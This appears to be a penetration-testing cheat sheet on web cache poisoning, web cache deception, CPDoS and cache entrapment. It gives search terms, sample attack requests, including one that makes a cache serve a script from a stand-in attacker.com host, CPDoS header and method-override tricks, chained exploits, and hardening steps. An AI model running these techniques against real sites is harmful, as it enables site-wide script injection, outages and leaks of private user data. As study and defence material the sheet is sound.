# Web Cache Poisoning & CPDoS — Tactical Pillar

**Tags:** #high #critical #cache-poisoning #cpdos #http-headers #wcd #wce
**OWASP:** A05:2021 Security Misconfiguration
**CVSS Base:** 7.2 (High) — 9.3 (Critical if leading to XSS for all users)

---

## 📖 What it is

**Web Cache Poisoning (WCP):** An attacker sends a request that causes the web cache (CDN, Varnish, Nginx) to store a malicious response (e.g., with XSS) and serve it to other users.
**Web Cache Deception (WCD):** An attacker tricks a victim into requesting a sensitive page with a static extension (`/profile/me.css`). The cache stores the victim's private JSON/HTML, making it public.
**CPDoS (Cache-rePlying Denial of Service):** An attacker poisons the cache with an error page (e.g., 400 Bad Request), effectively taking the site down for all users.

---

## 🔍 `grep_search` Tactics

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Vary:
Cache-Control:
max-age=
s-maxage=
proxy_cache
stale-while-revalidate
```

---

## 💣 Attack Category 1: Unkeyed Header Injection
**How it works:** The cache uses the "cache key" (usually Host + URL) to identify resources. Many headers are "unkeyed" (ignored by the cache key) but used by the backend to generate the response.
**Attack:**
```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

--- Response (Cached) ---
HTTP/1.1 200 OK
<script src="https://attacker.com/evil.js"></script>
```
**Impact:** All users visiting `target.com/page` receive the malicious script.

## 💣 Attack Category 2: CPDoS (Header Size Limit & Method Override)
**How it works:** Intermediate caches and origin servers often have different tolerances for header sizes or unsupported methods.
**Attack 1 (Oversized Header):** Send `X-Oversized: AAAAA...` (8KB). CDN accepts it, Origin returns `400 Bad Request`. CDN caches the 400 error.
**Attack 2 (Method Override):** Send `X-HTTP-Method-Override: POST` on a GET request. Origin rejects it (405 Method Not Allowed). CDN caches the 405 error for the GET endpoint.

## 💣 Attack Category 3: Unkeyed Query Parameters (Fat GET)
**How it works:** Caches often ignore tracking parameters (e.g., `?utm_source=`).
**Attack:** If the application reflects the `utm_source` in the DOM without sanitization, an attacker can poison the cache for the main URL (`/page?utm_source=<script>...`) and the cache serves it to users visiting `/page`.
**Fat GET:** Sending a GET request with a JSON body. If the cache ignores the body but the origin uses it, you can poison the response.

## 💣 Attack Category 4: Web Cache Entrapment (Hostile Cache Poisoning)
**How it works:** The backend ignores unknown extensions, but the CDN caches based on them.
**Attack:** Attacker requests `/api/user/profile;test.css`. The backend routes it to `/api/user/profile` (returning private JSON). The CDN sees `.css` and caches it publicly.

---

## 🛡️ Fix & Hardening
1. **Avoid Unkeyed Headers:** Do not use `X-Forwarded-*` headers to generate dynamic content in cached responses.
2. **Key Everything:** If you must use a header for logic, ensure it is part of the `Vary` header.
3. **Disable Cache for Errors:** Configure the CDN to never cache 4xx or 5xx responses.
4. **Strict Routing:** Backend APIs must reject (404) requests with appended static extensions (e.g., `.css` on a JSON endpoint).

---

## 🔗 Chain Exploits
```
Cache Poisoning + Reflected XSS ➔ Stored XSS for all users
Cache Poisoning + Open Redirect ➔ Massive phishing/redirect campaign
CPDoS ➔ Full site outage via a single request
WCD ➔ Massive PII Leakage
```
